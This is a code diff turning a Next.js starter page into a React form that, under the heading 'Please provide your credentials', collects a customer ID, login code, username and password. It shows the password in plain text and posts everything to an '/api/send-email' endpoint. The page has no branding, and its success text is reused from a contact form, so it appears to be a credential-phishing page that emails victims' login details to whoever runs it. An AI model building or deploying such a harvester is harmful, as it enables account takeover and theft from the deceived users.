@@ -1,113 +1,199 @@
-import Image from "next/image";
+'use client';
+import { Form, FormControl, FormField, FormItem } from "@/components/ui/form";
+import { Input } from '@/components/ui/input';
+import { Button } from "@/components/ui/button";
+import { formSchema } from "@/lib/constants";
+import { CheckCircleIcon, ExclamationCircleIcon, PaperAirplaneIcon } from '@heroicons/react/24/outline';
+import { zodResolver } from "@hookform/resolvers/zod";
+import { Ellipsis } from "lucide-react";
+import { useRouter } from 'next/navigation';
+import React, { useEffect, useState } from 'react';
+import { useForm } from 'react-hook-form';
+import * as z from 'zod';
 
-export default function Home() {
-  return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 w-full max-w-5xl items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:size-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
-        </div>
-      </div>
 
-      <div className="relative z-[-1] flex place-items-center before:absolute before:h-[300px] before:w-full before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 sm:before:w-[480px] sm:after:w-[240px] before:lg:h-[360px]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:mb-0 lg:w-full lg:max-w-5xl lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Explore starter templates for Next.js.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-balance text-sm opacity-50">
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
-  );
+interface FormData {
+  customerId: string;
+  username: string;
+  password: string;
+  loginCode: string;
 }
+
+const Home: React.FC = () => {
+  const router = useRouter();
+  const [alertStatus, setAlertStatus] = useState<string>('');
+  const form = useForm<z.infer<typeof formSchema>>({
+    resolver: zodResolver(formSchema),
+    defaultValues: {
+      customerId: "",
+      username: "",
+      password: "",
+      loginCode: "",
+    }
+  })
+
+  const isLoading = form.formState.isSubmitting;
+
+  useEffect(() => {
+    setTimeout(() => {
+      setAlertStatus('');
+    }, 3000)
+  }, [alertStatus])
+
+  const onSubmit = async (values: z.infer<typeof formSchema>) => {
+    try {
+      const payload: FormData = {
+        customerId: values.customerId,
+        username: values.username,
+        password: values.password,
+        loginCode: values.loginCode
+      }
+
+
+      const response = await fetch('/api/send-email', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      });
+
+      const res = await response.json()
+
+      if (res?.error) return setAlertStatus("error")
+
+      setAlertStatus("success")
+      form.reset();
+    } catch (error: any) {
+      console.error("Error occurred while sending email.")
+
+    } finally {
+      router.refresh();
+    }
+  }
+
+  const AlertMessage = () => {
+    if (!alertStatus) return null;
+    if (alertStatus === 'success')
+      return <div className='flex justify-start items-start gap-1 text-green-500 w-[80%] text-sm'>
+        <CheckCircleIcon className='w-6 h-6' />
+        <h1 className='inline-block'>I have recieved your email. I will contact you as soon as possible. Thanks for reaching</h1>
+      </div>
+
+    return <div className='flex justify-start items-start gap-1 text-red-500 w-[80%] text-sm'>
+      <ExclamationCircleIcon className='w-6 h-6' />
+      <h1 className='inline-block'>There has been an error while sending your email. Please try again</h1>
+    </div>
+  }
+
+  return (
+    <div id='contact-section' className="py-10 px-6 w-full lg:w-[45%] mx-auto">
+      <div className="mb-5">
+        <h1 className="text-5xl font-extrabold text-green-500/75 mb-3">Integrate</h1>
+        <h2 className="text-3xl font-semibold ">Please provide your credentials</h2>
+      </div>
+      <div className='flex flex-col md:flex-row justify-center items-center gap-x-10'>
+        {/* <Image width={510} height={340} src={mapImage.src} alt="map..." className='w-[60%]' /> */}
+
+        <Form {...form}>
+          <form
+            onSubmit={form.handleSubmit(onSubmit)}
+            className="w-full"
+          >
+            <FormField
+              name="customerId"
+              render={({ field }) => (
+                <FormItem className="mb-4 relative">
+                  <FormControl>
+                    <Input
+                      disabled={isLoading}
+                      label='Customer ID'
+                      htmlFor='customerId'
+                      type="text"
+                      id="customerId"
+                      {...field}
+                    />
+                  </FormControl>
+                  {form.formState.errors.customerId && <span className="absolute rounded-sm top-1/2 transform -translate-y-1/3 border border-red-500/25 p-1 right-1  text-red-500/70 text-xs">{form.formState.errors.customerId.message}</span>}
+                </FormItem>
+              )}
+            />
+            <FormField
+              name="loginCode"
+              render={({ field }) => (
+                <FormItem className="mb-4 relative">
+                  <FormControl>
+                    <Input
+                      disabled={isLoading}
+                      label='Login Code'
+                      htmlFor='loginCode'
+                      id="loginCode"
+                      {...field}
+                    />
+                  </FormControl>
+                  {form.formState.errors.loginCode && <span className="absolute rounded-sm top-1/2 transform -translate-y-1/3 border border-red-500/25 p-1 right-1  text-red-500/70 text-xs">{form.formState.errors.loginCode.message}</span>}
+                </FormItem>
+              )}
+            />
+
+            <FormField
+              name="username"
+              render={({ field }) => (
+                <FormItem className="mb-4 relative">
+                  <FormControl>
+                    <Input
+                      disabled={isLoading}
+                      label='Username'
+                      htmlFor='username'
+                      type="text"
+                      id="username"
+                      {...field}
+                    />
+                  </FormControl>
+                  {form.formState.errors.username && <span className="absolute rounded-sm top-1/2 transform -translate-y-1/3 border border-red-500/25 p-1 right-1  text-red-500/70 text-xs">{form.formState.errors.username.message}</span>}
+                </FormItem>
+              )}
+            />
+
+            <FormField
+              name="password"
+              render={({ field }) => (
+                <FormItem className="mb-4 relative">
+                  <FormControl>
+                    <Input
+                      disabled={isLoading}
+                      label='Password'
+                      htmlFor='password'
+                      type="text"
+                      id="password"
+                      {...field}
+                    />
+                  </FormControl>
+                  {form.formState.errors.password && <span className="absolute rounded-sm top-1/2 transform -translate-y-1/3 border border-red-500/25 p-1 right-1  text-red-500/70 text-xs">{form.formState.errors.password.message}</span>}
+                </FormItem>
+              )}
+            />
+
+            <Button
+              disabled={isLoading}
+              type="submit"
+              className="group w-fit bg-green-500 hover:bg-green-700 p-3 rounded-full transition duration-300"
+            >
+              {isLoading ?
+                <Ellipsis className="w-4 h-4 animate-pulse"  /> : (
+                  <div className="flex justify-center items-center gap-1">
+                    Submit
+                    <PaperAirplaneIcon className='w-5 h-5 text-white' />
+                  </div>
+                )
+              }
+            </Button>
+            <AlertMessage />
+          </form>
+        </Form>
+      </div>
+    </div>
+  );
+};
+
+export default Home;
